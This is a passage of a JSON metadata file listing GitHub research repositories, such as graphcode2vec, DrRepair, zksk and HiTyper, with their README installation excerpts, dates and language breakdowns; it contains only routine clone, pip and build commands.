                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Our tool is built on the top of [EvoMaster](https://www.evomaster.org/) which support JDK 8 and JDK 17 (the major LTS versions now).\n",
                    "type": "Text_excerpt",
                    "original_header": "Environment Setup",
                    "parent_header": [
                        "White-box Fuzzing RPC-based APIs: An Industrial Case Study"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/anonymous-authorxyz/fuzzing-rpc/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-05-20T06:01:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-20T07:40:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 3477961
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 2419522
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 473637
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 341585
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 236064
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 79512
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 36751
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Thrift",
                    "name": "Thrift",
                    "type": "Programming_language",
                    "size": 30233
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 19146
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "ANTLR",
                    "name": "ANTLR",
                    "type": "Programming_language",
                    "size": 12520
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 5862
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PLSQL",
                    "name": "PLSQL",
                    "type": "Programming_language",
                    "size": 5361
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 968
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "136": {
        "filename": "graphcode2vec_graphcode2vec_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/graphcode2vec/graphcode2vec",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Extract Graph tool\n  - We implement the tool based on Soot. Soot Version is in `pom.xml`.\n  - compile `mvn clean package`\n  - run command see the example, `extractGraphs.sh`\n- Requirements/Environment\n  - recommend that you use `conda`\n  - see  requirements.txt\n- Download Dataset from [Zenodo](https://doi.org/10.5281/zenodo.6394383)\n  - put all downloaded files to the `source` folder\n  - make sure you have enough disk space, around 100G, `bash untar.sh`\n  \n- Pretrained Model\n  1. https://drive.google.com/file/d/1PGF6e56CQ4XAfZMEU2Jl3w1TW4Q-59MG/view?usp=sharing\n  2. put it into the `source` folder and decompress \n- Run experiments\n  1. `cd source/graphscripts_experiments/`\n  2. run bash job files\n  3. reminding, it contains all trial experiment jobs. We will clean it later and keep only experiments on the paper. \n"
                },
                "confidence": 0.99647637551045,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/graphcode2vec/graphcode2vec/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-08-27T15:23:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-24T15:08:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 8012449
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 316029
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 46707
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 7172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "137": {
        "filename": "michiyasunaga_DrRepair_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/michiyasunaga/DrRepair",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-06-26T22:40:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-19T04:52:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 516976
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 15468
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "138": {
        "filename": "pwnslinger_sn4ke_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/pwnslinger/sn4ke",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`git clone --depth=1 --branch=wip/dev https://github.com/pwnslinger/gtirb-capstone/`  \nand install it effectively:  \n`python setup.py install`  \n",
                    "original_header": "Gtirb-capstone"
                },
                "confidence": 0.9894111713915293,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/pwnslinger/sn4ke/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-07-10T22:47:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-14T22:40:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 25846286
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 235932
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 41030
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 25255
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 20571
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 16263
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 11857
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 9241
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 7881
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PowerShell",
                    "name": "PowerShell",
                    "type": "Programming_language",
                    "size": 3558
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 1565
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 183
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 162
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 98
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 29
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 13
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "139": {
        "filename": "spring-epfl_zksk_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/spring-epfl/zksk",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": ".. |build_status| image:: https://travis-ci.org/spring-epfl/zksk.svg?branch=master\n   :target: https://travis-ci.org/spring-epfl/zksk\n   :alt: Build status \n.. |docs_status| image:: https://readthedocs.org/projects/zksk/badge/?version=latest\n   :target: https://zksk.readthedocs.io/?badge=latest\n   :alt: Documentation status \n.. |coverage| image:: https://codecov.io/gh/spring-epfl/zksk/branch/master/graph/badge.svg\n   :target: https://codecov.io/gh/spring-epfl/zksk\n   :alt: Test coverage \n.. |license| image:: https://img.shields.io/badge/License-MIT-yellow.svg\n   :target: https://opensource.org/licenses/MIT\n   :alt: MIT License \n.. image:: https://raw.githubusercontent.com/spring-epfl/zksk/master/images/bit_proof_stmt.svg?sanitize=true\n   :alt: PK{ (r): (C = rH) \u2228 (C - G = rH) } \n    # Setup: get the agreed group generators.\n    G, H = utils.make_generators(num=2, seed=42)\n    # Setup: define a randomizer with an unknown value.\n    r = Secret() \n+----------------+--------------------------------------------------------------------+\n| Docs           | https://zksk.readthedocs.io                                        |\n+----------------+--------------------------------------------------------------------+\n| Academic paper | https://arxiv.org/abs/1911.02459 \u2014                                 |\n|                | theoretical details                                                |\n+----------------+--------------------------------------------------------------------+ \nYou need to have Python 3.6 or higher to use zksk. The library is tested and supported on\nDebian-based systems. Mac support is not guaranteed. \nYou can install zksk using pip: \n   pip install git+https://github.com/spring-epfl/zksk \nTo make sure everything is in order, you can run unit tests. For that, install the dev version of\nthe package: \n   pip install \"git+https://github.com/spring-epfl/zksk#egg=zksk[dev]\" \n"
                },
                "confidence": 0.9895235687367213,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/spring-epfl/zksk/master/README.rst"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-09-30T10:33:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T09:59:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 170664
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "140": {
        "filename": "rizwan09_REDCODER_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/rizwan09/REDCODER",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installation\n\n\ud83e\udd17 Transformers is tested on Python 3.6+, and PyTorch 1.1.0+ or TensorFlow 2.0+.\n\nYou should install \ud83e\udd17 Transformers in a [virtual environment](https://docs.python.org/3/library/venv.html). If you're\nunfamiliar with Python virtual environments, check out the [user guide](https://packaging.python.org/guides/installing-using-pip-and-virtual-environments/). Create a virtual environment with the version of Python you're going \nto use and activate it.\n\nNow, if you want to use \ud83e\udd17 Transformers, you can install it with pip. If you'd like to play with the examples, you\nmust install it from source.\n\n## Installation with pip\n\nFirst you need to install one of, or both, TensorFlow 2.0 and PyTorch.\nPlease refer to [TensorFlow installation page](https://www.tensorflow.org/install/pip#tensorflow-2.0-rc-is-available) \nand/or [PyTorch installation page](https://pytorch.org/get-started/locally/#start-locally) regarding the specific \ninstall command for your platform.\n\nWhen TensorFlow 2.0 and/or PyTorch has been installed, \ud83e\udd17 Transformers can be installed using pip as follows:\n\n```bash\npip install transformers\n```\n\nAlternatively, for CPU-support only, you can install \ud83e\udd17 Transformers and PyTorch in one line with\n\n```bash\npip install transformers[torch]\n```\n\nor \ud83e\udd17 Transformers and TensorFlow 2.0 in one line with\n\n```bash\npip install transformers[tf-cpu]\n```\n\nTo check \ud83e\udd17 Transformers is properly installed, run the following command:\n\n```bash\npython -c \"from transformers import pipeline; print(pipeline('sentiment-analysis')('I hate you'))\"\n```\n\nIt should download a pretrained model then print something like\n\n```bash\n[{'label': 'NEGATIVE', 'score': 0.9991129040718079}]\n```\n\n(Note that TensorFlow will print additional stuff before that last statement.)\n\n## Installing from source\n\nTo install from source, clone the repository and install with the following commands:\n\n``` bash\ngit clone https://github.com/huggingface/transformers.git\ncd transformers\npip install -e .\n```\n\nAgain, you can run \n\n```bash\npython -c \"from transformers import pipeline; print(pipeline('sentiment-analysis')('I hate you'))\"\n```\n\nto check \ud83e\udd17 Transformers is properly installed.\n\n## Caching models\n\nThis library provides pretrained models that will be downloaded and cached locally. Unless you specify a location with\n`cache_dir=...` when you use methods like `from_pretrained`, these models will automatically be downloaded in the\nfolder given by the shell environment variable ``TRANSFORMERS_CACHE``. The default value for it will be the PyTorch\ncache home followed by ``/transformers/`` (even if you don't have PyTorch installed). This is (by order of priority):\n\n  * shell environment variable ``ENV_TORCH_HOME``\n  * shell environment variable ``ENV_XDG_CACHE_HOME`` + ``/torch/``\n  * default: ``~/.cache/torch/``\n\nSo if you don't have any specific environment variable set, the cache directory will be at\n``~/.cache/torch/transformers/``.\n\n**Note:** If you have set a shell enviromnent variable for one of the predecessors of this library\n(``PYTORCH_TRANSFORMERS_CACHE`` or ``PYTORCH_PRETRAINED_BERT_CACHE``), those will be used if there is no shell\nenviromnent variable for ``TRANSFORMERS_CACHE``.\n\n### Note on model downloads (Continuous Integration or large-scale deployments)\n\nIf you expect to be downloading large volumes of models (more than 1,000) from our hosted bucket (for instance through\nyour CI setup, or a large-scale production deployment), please cache the model files on your end. It will be way\nfaster, and cheaper. Feel free to contact us privately if you need any help.\n\n## Do you want to run a Transformer model on a mobile device?\n\nYou should check out our [swift-coreml-transformers](https://github.com/huggingface/swift-coreml-transformers) repo.\n\nIt contains a set of tools to convert PyTorch or TensorFlow 2.0 trained Transformer models (currently contains `GPT-2`, \n`DistilGPT-2`, `BERT`, and `DistilBERT`) to CoreML models that run on iOS devices.\n\nAt some point in the future, you'll be able to seamlessly move from pre-training or fine-tuning models in PyTorch or\nTensorFlow 2.0 to productizing them in CoreML, or prototype a model or an app in CoreML then research its\nhyperparameters or architecture from PyTorch or TensorFlow 2.0. Super exciting!\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/rizwan09/REDCODER/main/transformers-3.0.2/docs/source/installation.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-05T15:16:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-05T09:46:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 6180960
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 698182
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 97297
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20525
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 6641
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 3781
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 1261
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "141": {
        "filename": "shrivastavadisha_repo_level_prompt_generation_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/shrivastavadisha/repo_level_prompt_generation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The web URLs for all the repositories used in our work is provided in <ins>projects.txt</ins>. Download and store them in a folder called <ins>gcode-data</ins>. Then run `script_gen_and_preprocess_data.py`. This script will produce an output file called <ins>commands_gen_and_preprocess</ins>. Running it will execute three scripts:\n - `create_sample_data.py`: creates the hole completion data by choosing the midpoint of each line as hole position.\n - `parse_tree.py`: creates a parse tree for each file as well as store repo-level meta-info needed to get rule-context.\n - `check_duplication.py`: check for duplicates within a repo.\nRunning this will create a new folder called rule_classifier_data that has train, val and test subfolders. Inside each folder, we will have a folder for a repository that will contain the following: \n",
                    "original_header": "Data preprocessing"
                },
                "confidence": 0.9624454724458205,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shrivastavadisha/repo_level_prompt_generation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Example usage: `python generate_rule_representations.py --data_split=val --repo=jata4test --emb_model_type=codebert` \n",
                    "original_header": "Generating the rule context representations for the rule classifier"
                },
                "confidence": 0.9265517514497795,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shrivastavadisha/repo_level_prompt_generation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`rearrange_data.py`\nThis script will cap the maximum contribution from a repo to 10000 holes. After this, each repo folder will contain files <ins>capped_holes_10000</ins>, <ins>capped_codebert_mod</ins> and <ins>capped_oracle_10000</ins>.\n \n",
                    "original_header": "Capping the number of holes"
                },
                "confidence": 0.9999893577029717,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shrivastavadisha/repo_level_prompt_generation/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-06-07T19:53:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-20T07:04:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 150598
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "142": {
        "filename": "zenscr_PyPRSVT_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mikeczech/PyVRank",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* https://arxiv.org/abs/1703.00757\n* https://sv-comp.sosy-lab.org/2014/\n \n",
                    "original_header": "Paper and Other Resources"
                },
                "confidence": 0.9949986916883482,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/zenscr/PyPRSVT/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-09-01T14:14:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-20T09:26:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 64680
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SWIG",
                    "name": "SWIG",
                    "type": "Programming_language",
                    "size": 24444
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1025
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 203
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "143": {
        "filename": "aserg-ufmg_Truck-Factor_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/aserg-ufmg/Truck-Factor",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The scripts for extract commit information from git repositories are implemented using Shell and AWK. So, the execution environment must support those script languages.  Optionally, the Ruby interpreter is required if you decide to use the Linguist library to automatically discard files like documentation and third-party libraries. See the specific Linguist requirements in [linguist page](https://github.com/github/linguist). \n",
                    "original_header": "Environment"
                },
                "confidence": 0.9999988207938617,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/aserg-ufmg/Truck-Factor/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* Filtered files (`filtered-files.txt`): set files that must be discard before start the TF calculation. \n  * Info pattern: `<git_repository_fullname>;<file_path>;<filter_info>`\n* Aliases (`alias.txt`): set developers aliases.\n  * Info pattern: `<git_repository_fullname>;<developer_alias1>;<developer_alias2>`\n* Modules (`modules.txt`): map files to modules. \n  * Info pattern: `<git_repository_fullname>;<file_path>;<module_name>`\n  * * Module calculation not implemented yet.\n \n",
                    "original_header": "Optional Settings"
                },
                "confidence": 0.9994497906282899,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/aserg-ufmg/Truck-Factor/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-07-11T16:12:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-30T07:26:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 172950
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 993
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 262
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 249
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Awk",
                    "name": "Awk",
                    "type": "Programming_language",
                    "size": 216
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "144": {
        "filename": "chenjshnn_WAE_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/chenjshnn/WAE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-02-21T01:45:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-01T03:18:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 61044
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 349
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "145": {
        "filename": "qiankunmu_HDHGN_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/qiankunmu/HDHGN",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Our experiment is done in Ubuntu 18.04.6 LTS and in python 3.8. We implement our model by [pytorch 1.10](https://pytorch.org/docs/1.10/) and [torch geometric 2.1.0](https://pytorch-geometric.readthedocs.io/en/2.1.0/index.html). We train our model on a RTX 3090. The required environments are listed in requirements.txt.\n \n",
                    "original_header": "Requirments"
                },
                "confidence": 0.9719556905093799,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/qiankunmu/HDHGN/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Our datasets Python800 and Java250 are from [Project CodeNet](https://github.com/IBM/Project_CodeNet). You can download the datasets from <https://developer.ibm.com/data/project-codenet/>. You need to download [Project_CodeNet_Python800.tar.gz](https://dax-cdn.cdn.appdomain.cloud/dax-project-codenet/1.0.0/Project_CodeNet_Python800.tar.gz) and [Project_CodeNet_Java250.tar.gz](https://dax-cdn.cdn.appdomain.cloud/dax-project-codenet/1.0.0/Project_CodeNet_Java250.tar.gz). Then you need to put them into the data directory of our project.\n \n",
                    "original_header": "Datasets"
                },
                "confidence": 0.9956484258328439,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/qiankunmu/HDHGN/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-25T08:36:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-01T01:55:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 46377
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 203
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "146": {
        "filename": "JohnnyPeng18_HiTyper_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JohnnyPeng18/HiTyper",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Install HiTyper from source\n\nTo use HiTyper on your own computer, you can build from source: (If you need to modify the source code of HiTyper, please use this method and re-run the `pip install .` after modification each time)\n\n```sh\ngit clone https://github.com/JohnnyPeng18/HiTyper.git && cd HiTyper\npip install .\n```\n\n2. Install HiTyper using `pip`\n\nYou can install the latest version of HiTyper by using the following command:\n\n```sh\npip install hityper\n```\n\n**Requirements:**\n\n- Python>=3.9\n- Linux\n\nHiTyper requires running under Python >= 3.9 because there are a lot of new nodes introduced on AST from Python 3.9. However, HiTyper can analyze most files written under Python 3 since Python's AST is backward compatible.\n\nYou are recommended to use `Anaconda` to create a clean Python 3.9 environment and avoid most dependency conflicts:\n\n````sh\nconda create -n hityper python=3.9\n````\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "HiTyper"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/JohnnyPeng18/HiTyper/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
